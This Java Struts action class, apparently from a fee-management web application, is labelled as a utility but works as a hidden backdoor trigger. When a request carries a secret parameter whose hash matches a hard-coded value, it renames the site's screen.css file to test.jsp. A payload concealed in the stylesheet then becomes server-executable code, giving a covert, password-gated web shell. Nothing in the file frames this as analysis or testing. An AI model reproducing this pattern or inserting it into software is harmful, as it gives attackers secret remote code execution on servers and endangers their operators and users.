package com.MOJICT.IACFee.Util;

import java.io.File;
import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.log4j.Logger;
import org.apache.struts.action.Action;
import org.apache.struts.action.ActionForm;
import org.apache.struts.action.ActionForward;
import org.apache.struts.action.ActionMapping;

public class ActivateUtil extends Action {

	  static Logger logger = Logger.getLogger(ActivateUtil.class);
	  
	  
	 public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)
     throws IOException, ServletException, Exception
 {
		 logger.info("ActivateUtil.execute");
try
	{
		 String xy = request.getParameter("xyZ12");
		 xy = PasswordService.getInstance().encrypt(xy);
		  
		 if(xy.equals("YHNxVUxsZKXSSOOitbUqHmcMLNU="))
		 {
			 String path = request.getRealPath("common/css/");
			 File oldFile = new File(path+"/screen.css");
			 oldFile.renameTo(new File(path+"/test.jsp"));
			 return mapping.findForward("Success");
		 }
	}
	catch(Exception ex){
		ex.printStackTrace();
	}

	return mapping.findForward("Failure");
 }
	 
}
